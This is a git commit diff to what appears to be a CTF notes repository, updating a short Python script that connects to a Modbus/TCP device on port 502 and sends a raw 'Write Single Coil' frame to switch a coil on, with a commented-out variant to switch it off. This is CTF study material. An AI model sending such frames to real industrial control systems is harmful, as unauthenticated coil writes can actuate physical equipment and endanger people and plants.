85ef638257a6e47feb667a9ade7bcf3062adc6ae
wgf4242 <wgf4242@gmail.com>
2024-06-11 00:55:07 +0800

    sync

--- docs/ctf/scripts/ICS_modbus_tcp_start.py
+++ docs/ctf/scripts/ICS_modbus_tcp_start.py
@@ -1,25 +1,24 @@
+"""
+\xff 是置1, \x00 是置0
+"""
 import socket
-import time
-import getopt
-import sys
-import struct
-import os
-
 
 if __name__ == "__main__":
     dstport = 502
-    dstip ="192.168.180.146"
-    addr = (dstip,dstport)
-    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    dstip = "192.168.80.136"
+    addr = (dstip, dstport)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect(addr)
 
-    ##(Write coil)
-    sendstr1="\x00\x00\x00\x00\x00\x06\x01\x05\x00\x03\xff\x00"
+    ##(Write 1 coil)
+    # sendstr1 = b"\x00\x00\x00\x00\x00\x06\x01\x05\x00\x00\xff\x00"
+    maddr = b"\x00\x00"
+    sendstr1 = b"\x00\x00\x00\x00\x00\x06\x01\x05%s\xff\x00" % maddr
     sock.send(sendstr1)
-    print sock.recv(1024000)
 
-
+    ## write 0
+    # sendstr1 = b"\x00\x00\x00\x00\x00\x06\x01\x05\x00\x00\x00\x00"
+    # sock.send(sendstr1)
+    print(sock.recv(1024000))
 
     sock.close()
-
-
